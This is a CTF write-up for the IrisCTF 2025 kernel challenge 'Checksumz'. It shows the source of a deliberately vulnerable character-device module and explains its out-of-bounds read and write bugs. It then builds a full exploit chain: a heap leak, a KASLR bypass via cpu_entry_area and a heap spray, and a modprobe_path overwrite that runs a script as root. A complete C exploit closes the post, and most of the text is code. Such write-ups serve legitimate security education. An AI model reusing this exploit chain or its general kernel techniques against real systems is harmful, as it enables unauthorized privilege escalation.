---
title: Checksumz
description: Someone told me that I can write faster programs by putting them into kernel modules, so I replaced my checksum function with a char device.
categories: ["ctf", "IrisCTF 2025"]
tags: ["pwn", "kernel"]
media_subpath: "/assets/posts/2025/irisctf/checksumz"
---

This is a kernel challenge. We are given a vulnerable module, and we have to get root permissions to get the flag.

```c
// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * This kernel module has serious security issues (and probably some implementation
 * issues), and might crash your kernel at any time. Please don't load this on any
 * system that you actually care about. I recommend using a virtual machine for this.
 * You have been warned.
 */

#define DEVICE_NAME "checksumz"
#define pr_fmt(fmt) DEVICE_NAME ": " fmt

#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/module.h>
#include <linux/uio.h>
#include <linux/version.h>

#include "api.h"

static void adler32(const void *buf, size_t len, uint32_t* s1, uint32_t* s2) {
  const uint8_t *buffer = (const uint8_t*)buf;

  for (size_t n = 0; n < len; n++) {
    *s1 = (*s1 + buffer[n]) % 65521;
    *s2 = (*s2 + *s1) % 65521;
  }
}

/* ***************************** DEVICE OPERATIONS ***************************** */

static loff_t checksumz_llseek(struct file *file, loff_t offset, int whence) {
  struct checksum_buffer* buffer = file->private_data;

  switch (whence) {
    case SEEK_SET:
      buffer->pos = offset;
      break;
    case SEEK_CUR:
      buffer->pos += offset;
      break;
    case SEEK_END:
      buffer->pos = buffer->size - offset;
      break;
    default:
      return -EINVAL;
  }

  if (buffer->pos < 0)
    buffer->pos = 0;

  if (buffer->pos >= buffer->size)
    buffer->pos = buffer->size - 1;

  return buffer->pos;
}

static ssize_t checksumz_write_iter(struct kiocb *iocb, struct iov_iter *from) {
  struct checksum_buffer* buffer = iocb->ki_filp->private_data;
  size_t bytes = iov_iter_count(from);

  if (!buffer)
    return -EBADFD;
  if (!bytes)
    return 0;

  ssize_t copied = copy_from_iter(buffer->state + buffer->pos, min(bytes, 16), from);

  buffer->pos += copied;
  if (buffer->pos >= buffer->size)
    buffer->pos = buffer->size - 1;

  return copied;
}

static ssize_t checksumz_read_iter(struct kiocb *iocb, struct iov_iter *to) {
  struct checksum_buffer* buffer = iocb->ki_filp->private_data;
  size_t bytes = iov_iter_count(to);

  if (!buffer)
    return -EBADFD;
  if (!bytes)
    return 0;
  if (buffer->read >= buffer->size) {
    buffer->read = 0;
    return 0;
  }

  ssize_t copied = copy_to_iter(buffer->state + buffer->pos, min(bytes, 256), to);

  buffer->read += copied;
  buffer->pos += copied;
  if (buffer->pos >= buffer->size)
    buffer->pos = buffer->size - 1;

  return copied;
}

static long checksumz_ioctl(struct file *file, unsigned int command, unsigned long arg) {
  struct checksum_buffer* buffer = file->private_data;

  if (!file->private_data)
    return -EBADFD;

  switch (command) {
    case CHECKSUMZ_IOCTL_RESIZE:
      if (arg <= buffer->size && arg > 0) {
        buffer->size = arg;
        buffer->pos = 0;
      } else
      return -EINVAL;

      return 0;
    case CHECKSUMZ_IOCTL_RENAME:
      char __user *user_name_buf = (char __user*) arg;

      if (copy_from_user(buffer->name, user_name_buf, 48)) {
        return -EFAULT;
      }

      return 0;
    case CHECKSUMZ_IOCTL_PROCESS:
      adler32(buffer->state, buffer->size, &buffer->s1, &buffer->s2);
      memset(buffer->state, 0, buffer->size);
      return 0;
    case CHECKSUMZ_IOCTL_DIGEST:
      uint32_t __user *user_digest_buf = (uint32_t __user*) arg;
      uint32_t digest = buffer->s1 | (buffer->s2 << 16);

      if (copy_to_user(user_digest_buf, &digest, sizeof(uint32_t))) {
        return -EFAULT;
      }

      return 0;
    default:
      return -EINVAL;
  }

  return 0;
}

/* This is the counterpart to open() */
static int checksumz_open(struct inode *inode, struct file *file) {
  file->private_data = kzalloc(sizeof(struct checksum_buffer), GFP_KERNEL);

  struct checksum_buffer* buffer = (struct checksum_buffer*) file->private_data;

  buffer->pos = 0;
  buffer->size = 512;
  buffer->read = 0;
  buffer->name = kzalloc(1000, GFP_KERNEL);
  buffer->s1 = 1;
  buffer->s2 = 0;

  const char* def = "default";
  memcpy(buffer->name, def, 8);

  for (size_t i = 0; i < buffer->size; i++)
    buffer->state[i] = 0;

  return 0;
}

/* This is the counterpart to the final close() */
static int checksumz_release(struct inode *inode, struct file *file)
{
  if (file->private_data)
    kfree(file->private_data);
  return 0;
}

/* All the operations supported on this file */
static const struct file_operations checksumz_fops = {
  .owner = THIS_MODULE,
  .open = checksumz_open,
  .release = checksumz_release,
  .unlocked_ioctl = checksumz_ioctl,
  .write_iter = checksumz_write_iter,
  .read_iter = checksumz_read_iter,
  .llseek = checksumz_llseek,
};


/* ***************************** INITIALIZATION AND CLEANUP (You can mostly ignore this.) ***************************** */

static dev_t device_region_start;
static struct class *device_class;
static struct cdev device;

/* Create the device class */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
static inline struct class *checksumz_create_class(void) { return class_create(DEVICE_NAME); }
#else
static inline struct class *checksumz_create_class(void) { return class_create(THIS_MODULE, DEVICE_NAME); }
#endif

/* Make the device file accessible to normal users (rw-rw-rw-) */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 2, 0)
static char *device_node(const struct device *dev, umode_t *mode) { if (mode) *mode = 0666; return NULL; }
#else
static char *device_node(struct device *dev, umode_t *mode) { if (mode) *mode = 0666; return NULL; }
#endif

/* Create the device when the module is loaded */
static int __init checksumz_init(void)
{
  int err;

  if ((err = alloc_chrdev_region(&device_region_start, 0, 1, DEVICE_NAME)))
    return err;

  err = -ENODEV;

  if (!(device_class = checksumz_create_class()))
    goto cleanup_region;
  device_class->devnode = device_node;

  if (!device_create(device_class, NULL, device_region_start, NULL, DEVICE_NAME))
    goto cleanup_class;

  cdev_init(&device, &checksumz_fops);
  if ((err = cdev_add(&device, device_region_start, 1)))
    goto cleanup_device;

  return 0;

cleanup_device:
  device_destroy(device_class, device_region_start);
cleanup_class:
  class_destroy(device_class);
cleanup_region:
  unregister_chrdev_region(device_region_start, 1);
  return err;
}

/* Destroy the device on exit */
static void __exit checksumz_exit(void)
{
  cdev_del(&device);
  device_destroy(device_class, device_region_start);
  class_destroy(device_class);
  unregister_chrdev_region(device_region_start, 1);
}

module_init(checksumz_init);
module_exit(checksumz_exit);

/* Metadata that the kernel really wants */
MODULE_DESCRIPTION("/dev/" DEVICE_NAME ": a vulnerable kernel module");
MODULE_AUTHOR("LambdaXCF <hello@lambda.blog>");
MODULE_LICENSE("GPL");
```
{: file="chal.c" }

```c
#ifndef CHECKSUMZ_API_H
#define CHECKSUMZ_API_H

/* You may want to include this from userspace code, since this describes the valid ioctls */

#ifdef __KERNEL__
#include <linux/types.h>
#include <linux/ioctl.h>
#else /* !__KERNEL__ */
#include <stddef.h>
#include <sys/ioctl.h>
#include <stdint.h>
#define __user /* __user means nothing in userspace, since everything is a user pointer anyways */
#endif

struct checksum_buffer {
	loff_t pos;
	char state[512];
	size_t size;
	size_t read;
	char* name;
	uint32_t s1;
	uint32_t s2;
};

#define CHECKSUMZ_IOCTL_RENAME   _IOWR('@', 0, char*)
#define CHECKSUMZ_IOCTL_PROCESS  _IO('@', 1)
#define CHECKSUMZ_IOCTL_RESIZE   _IOWR('@', 2, uint32_t)
#define CHECKSUMZ_IOCTL_DIGEST   _IOWR('@', 3, uint32_t*)

#endif /* SONGBIRD_API_H */ 
```
{: file="api.h" }

We have to read `/dev/vda` to get the flag.

Whenever the char device is opened, it calls `checksumz_open`, which allocates a structure of type `checksum_buffer`.
Using the file descriptor, we can read from or write into the buffer. There are also some IOCTL handlers.
The challenge has `kaslr` enabled, so we need a leak first.

Let's look at the read function first. Even though it checks `buffer->read >= buffer->size` and we can read maximum
256 bytes, the check is wrongly implemented. It doesn't take into account the number of bytes we are trying to read.
So, if `buffer->read` is 500, and `buffer->size` is 512, we can still read 256 bytes and achieve out-of-bounds read.

We can get a heap leak by leaking the `->name` field of the `checksum_buffer`, which is returned by `kzalloc`.
`buffer->size` is 512, so we can set `buffer->pos` to 511 to be able to read again without triggering the `if` check.
We have 1 char left from the `->state`, then 2 qwords (`->size` and `->read`) and then the heap leak, `->name`.

```c
size_t leak_heap(int fd) {
    // set buf->pos to 511
    {
        {
            char buf[256] = { 0 };
            read(fd, buf, sizeof buf);
        }

        {
            char buf[255] = { 0 };
            read(fd, buf, sizeof buf);
        }
    }

    // now that we can read out of bounds, read the 
    // buffer structure
    {
        struct {
            char __padding;
            size_t size;
            size_t read;
            char* name;

        } __attribute__((packed)) buf;
        read(fd, &buf, sizeof buf);

        return (size_t)buf.name;
    }
}
```

Now that we have a heap leak, we need a kernel address leak. We can use the `cpu_entry_area` trick, which is an address
containing kernel pointers, not affected by `kaslr`, at address `0xfffffe0000000000`.

![](01.png)

We can see that starting at address `0xfffffe0000000004` we have some kernel pointers. But first, we need to transform
the read primitive into a more powerful one.

We have the `checksumz_llseek` function, which is called when the user calls `lseek` on the file descriptor. However,
we are limited by the `->size` field of the buffer.

The write function doesn't even implement a bounds check, but we can write 16 bytes at most. We can use the read function
to advance the `->pos` field once again to 511, and use the write function to overwrite the following 16 bytes, which consist
of 1 byte left from `->state`, the full `->size` field and 7 out of 8 bytes of the `->read` field. If we set the `->size` field
to `0xffffffffffffffff`, we can set `->pos` to anything we want, then use the read function to achieve an arbitrary read primitive.

However, the read function uses `buffer->state` as the starting point. Due to `kaslr`, we do not know where that is. Even if we
achieved a heap leak, we cannot reliably compute the address of the buffer structure, since `->name` is allocated separately.
We can do a heap spray by allocating large amounts of `checksum_buffer`s (by calling `open` on the char device) and choose a random
offset from the heap leak (say, `-0x400`). Then, for each new file descriptor created, try to read the `cpu_entry_area`, assuming
that the address of the buffer is the computed address with the offset. One of the descriptors will most probably be allocated
at that offset. I found that this technique is pretty reliable, and only failed 2 or 3 times out of tens of runs.

We know a kernel address when we see one: it starts with `0xFFFFFFFF`. Also, after subtracting the offset of the leak,
the result (kernel base) should end in five zeroes.

```c 
int fds[FD_COUNT] = { 0 };

for (int i = 0; i < ARRAY_SIZE(fds); i += 1) {
    fds[i] = open(TARGET, O_RDWR);
}

size_t heap_leak = leak_heap(fds[0]);
printf("Heap leak: %p\n", heap_leak);
size_t current_buffer = heap_leak - 0x400;
printf("Current buffer: %p\n", current_buffer);

size_t kernel_base = 0;
// spray pages to find which one contains the desired offset
for (int i = 0; i < ARRAY_SIZE(fds); i += 1) {
    int fd = fds[i];
    size_t kernel_leak = try_read_kernel(fd, current_buffer, i != 0);
    // kernel base has higher dword filled with 1s
    if (kernel_leak >> 32 != 0xFFFFFFFF || kernel_leak == 0xFFFFFFFFFFFFFFFF) {
        continue;
    }
    printf("Kernel leak: %p\n", kernel_leak);
    kernel_base = kernel_leak - 0x1008e00;
    // kernel base has lower bytes 0
    if (kernel_base & 0xfffff != 0) {
        continue;
    }
    printf("Kernel base: %p\n", kernel_base);
    break;
}
if (kernel_base == 0) {
    printf("Kernel base not found... try again\n");
    return -1;
}
```

`try_read_kernel` uses the read, write and seek functions to achieve what was explained above:
```c
size_t try_read_kernel(int fd, size_t current_buffer, int adjust_initial_pos) {
    if (adjust_initial_pos) {
        // set buffer->pos to 511
        for (int i = 0; i < 2; i += 1) {
            char buf[256] = { 0 };
            read(fd, buf, sizeof buf);
        }
    }

    // set size to a large value so we can freely control
    // buffer->pos
    {
        struct {
            char __padding;
            size_t size;
            size_t read : (64 - 8);
        } __attribute__((packed)) buf = {
            .size = 0xffffffffffffffff,
            .read = 0,
        };
        write(fd, &buf, sizeof buf);
    }

    // set buffer->pos such that we can read the cpu_entry_area
    {
        lseek(fd, cpu_entry_area - current_buffer - 8, SEEK_SET);
    }

    // read the leak
    {
        char buf[16] = { 0 };
        read(fd, buf, sizeof buf);
        return *(size_t *)buf;
    }
}
```

Now that we have a kernel leak, we can proceed with the exploit. The easiest way is to overwrite `modprobe_path`,
which is a string in memory defining the path to a program that will be called (with root privileges) when the user
tries to execute a file with an unknown magic header. The path is stored in a writable page, and since we have the 
kernel base, we can compute its address. But we still need an arbitrary write. We can go with a similar technique for
leaking the kernel address, by using the sprayed buffers, but we have a more reliable way through `ioctl` calls. We have
an `ioctl` code for renaming the buffer, which writes whatever we want into the buffer pointed at by the `->name` field.
We can use a file descriptor, set its `->pos` to the offset of `->name`, write the address of `modprobe_path` and call
the `ioctl` handler to overwrite `modprobe_path`.

```c
size_t modprobe_path = kernel_base + modprobe_path_offset;
printf("modprobe_path: %p\n", modprobe_path);

// point buffer->pos so we can write in buffer->name
lseek(fds[0], 512 + 16, SEEK_SET);
// write modprobe_path in buffer->name
write(fds[0], &modprobe_path, sizeof modprobe_path);

prepare_modprobe_files();

// write to modprobe_path
ioctl(fds[0], CHECKSUMZ_IOCTL_RENAME, EXPLOIT_SH);

// execute invalid file that will trigger modprobe_path
system(TRIGGER_SH);
```

But we also have to prepare the files needed for the `modprobe_path` exploit. We need a file with an invalid
magic header, and a file that will actually do the exploit. The path of the second file will be written into `modprobe_path`,
while the first one will just be executed to trigger the exploit.

```c 
void prepare_modprobe_files() {
    {
        int fd = open(EXPLOIT_SH, O_CREAT | O_WRONLY);
        char buf[] = "#!/bin/sh\ntouch /tmp/pwned\ncat /dev/vda > /tmp/flag\nchmod 777 /tmp/flag\n";
        write(fd, buf, sizeof buf);
        fchmod(fd, 0777);
        close(fd);
    }
    {
        int fd = open(TRIGGER_SH, O_CREAT | O_WRONLY);
        char buf[] = "\xff\xff\xff\xff";
        write(fd, buf, sizeof buf);
        fchmod(fd, 0777);
        close(fd);
    }
}
```

After executing the exploit, we now have a file called `pwned` and a copy of the flag.

![](02.png)

Final exploit:

```c
#include "api.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>

#define TARGET "/dev/checksumz"
#define ARRAY_SIZE(array) (sizeof(array) / sizeof(array[0]))
#define FD_COUNT 1000
#define EXPLOIT_SH "/tmp/exploit.sh"
#define TRIGGER_SH "/tmp/trigger.sh"

const size_t cpu_entry_area = 0xfffffe0000000004;
const size_t modprobe_path_offset = 0x1b3f100;

size_t leak_heap(int fd) {
    // set buf->pos to 511
    {
        {
            char buf[256] = { 0 };
            read(fd, buf, sizeof buf);
        }

        {
            char buf[255] = { 0 };
            read(fd, buf, sizeof buf);
        }
    }

    // now that we can read out of bounds, read the 
    // buffer structure
    {
        struct {
            char __padding;
            size_t size;
            size_t read;
            char* name;

        } __attribute__((packed)) buf;
        read(fd, &buf, sizeof buf);

        return (size_t)buf.name;
    }
}

size_t try_read_kernel(int fd, size_t current_buffer, int adjust_initial_pos) {
    if (adjust_initial_pos) {
        // set buffer->pos to 511
        for (int i = 0; i < 2; i += 1) {
            char buf[256] = { 0 };
            read(fd, buf, sizeof buf);
        }
    }

    // set size to a large value so we can freely control
    // buffer->pos
    {
        struct {
            char __padding;
            size_t size;
            size_t read : (64 - 8);
        } __attribute__((packed)) buf = {
            .size = 0xffffffffffffffff,
            .read = 0,
        };
        write(fd, &buf, sizeof buf);
    }

    // set buffer->pos such that we can read the cpu_entry_area
    {
        lseek(fd, cpu_entry_area - current_buffer - 8, SEEK_SET);
    }

    // read the leak
    {
        char buf[16] = { 0 };
        read(fd, buf, sizeof buf);
        return *(size_t *)buf;
    }
}

void prepare_modprobe_files() {
    {
        int fd = open(EXPLOIT_SH, O_CREAT | O_WRONLY);
        char buf[] = "#!/bin/sh\ntouch /tmp/pwned\ncat /dev/vda > /tmp/flag\nchmod 777 /tmp/flag\n";
        write(fd, buf, sizeof buf);
        fchmod(fd, 0777);
        close(fd);
    }
    {
        int fd = open(TRIGGER_SH, O_CREAT | O_WRONLY);
        char buf[] = "\xff\xff\xff\xff";
        write(fd, buf, sizeof buf);
        fchmod(fd, 0777);
        close(fd);
    }
}

int main() {
    int fds[FD_COUNT] = { 0 };
    
    for (int i = 0; i < ARRAY_SIZE(fds); i += 1) {
        fds[i] = open(TARGET, O_RDWR);
    }
    
    size_t heap_leak = leak_heap(fds[0]);
    printf("Heap leak: %p\n", heap_leak);
    size_t current_buffer = heap_leak - 0x400;
    printf("Current buffer: %p\n", current_buffer);

    size_t kernel_base = 0;
    // spray pages to find which one contains the desired offset
    for (int i = 0; i < ARRAY_SIZE(fds); i += 1) {
        int fd = fds[i];
        size_t kernel_leak = try_read_kernel(fd, current_buffer, i != 0);
        // kernel base has higher dword filled with 1s
        if (kernel_leak >> 32 != 0xFFFFFFFF || kernel_leak == 0xFFFFFFFFFFFFFFFF) {
            continue;
        }
        printf("Kernel leak: %p\n", kernel_leak);
        kernel_base = kernel_leak - 0x1008e00;
        // kernel base has lower bytes 0
        if (kernel_base & 0xfffff != 0) {
            continue;
        }
        printf("Kernel base: %p\n", kernel_base);
        break;
    }
    if (kernel_base == 0) {
        printf("Kernel base not found... try again\n");
        return -1;
    }

    size_t modprobe_path = kernel_base + modprobe_path_offset;
    printf("modprobe_path: %p\n", modprobe_path);

    // point buffer->pos so we can write in buffer->name
    lseek(fds[0], 512 + 16, SEEK_SET);
    // write modprobe_path in buffer->name
    write(fds[0], &modprobe_path, sizeof modprobe_path);

    prepare_modprobe_files();

    // write to modprobe_path
    ioctl(fds[0], CHECKSUMZ_IOCTL_RENAME, EXPLOIT_SH);

    // execute invalid file that will trigger modprobe_path
    system(TRIGGER_SH);
} 
```
